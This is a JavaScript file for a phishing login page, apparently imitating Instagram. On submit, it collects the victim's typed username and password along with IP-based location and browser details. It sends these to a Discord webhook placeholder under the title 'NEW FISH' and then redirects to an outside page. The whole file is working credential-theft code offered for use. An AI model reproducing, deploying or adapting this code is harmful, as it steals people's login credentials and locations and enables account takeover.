const loginButton = document.querySelector("button[type='submit']");
const password = document.querySelector("#password");
const username = document.querySelector("#email");
const showPasswordBtn = document.querySelector("#tchange");

password.addEventListener("input", disableBtn);
username.addEventListener("input", disableBtn);

showPasswordBtn.addEventListener("click", passwordVisible);

function passwordVisible() {
  if (password.type === "password") {
    password.type = "text";
    showPasswordBtn.textContent = "Hide";
  } else {
    password.type = "password";
    showPasswordBtn.textContent = "Show";
  }
}

function disableBtn() {
  if (username.value && password.value) {
    loginButton.disabled = false;
  } else {
    loginButton.disabled = true;
  }
}

let Info;

loginButton.addEventListener("click", () => {
  (async function() {
    Info = await getInfo();
    console.log(Info);
    sendInfo();
  })();
});

async function getInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();

    const info = `> IP: ${data.ip}\n> City: ${data.city}\n> Region: ${data.region}\n> Country: ${data.country_name}\n> Postal Code: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;

    return info;
  } catch {
    return `> IP: Unknown\n> City: Unknown\n> Region: Unknown\n> Country: Unknown\n> Postal Code: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
  }
}

async function sendInfo() {
  const webhook = "YOUR_DISCORD_WEBHOOK_URL";

  const embed = {
    color: 1585803, // #18328b
    title: "NEW FISH",
    description: `${Info}`,
    footer: {
      text: "@terrykiddo",
    },
  };

  const config = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ username: "TK_IGlogs", embeds: [embed] }),
  };

  try {
    await fetch(webhook, config);
  } catch {
    setTimeout(function() {
      window.location.replace("https://spring-feather-2536.on.fleek.co/");
    }, 1000);
  }
  setTimeout(function() {
    window.location.replace("https://spring-feather-2536.on.fleek.co/");
  }, 1000);
}
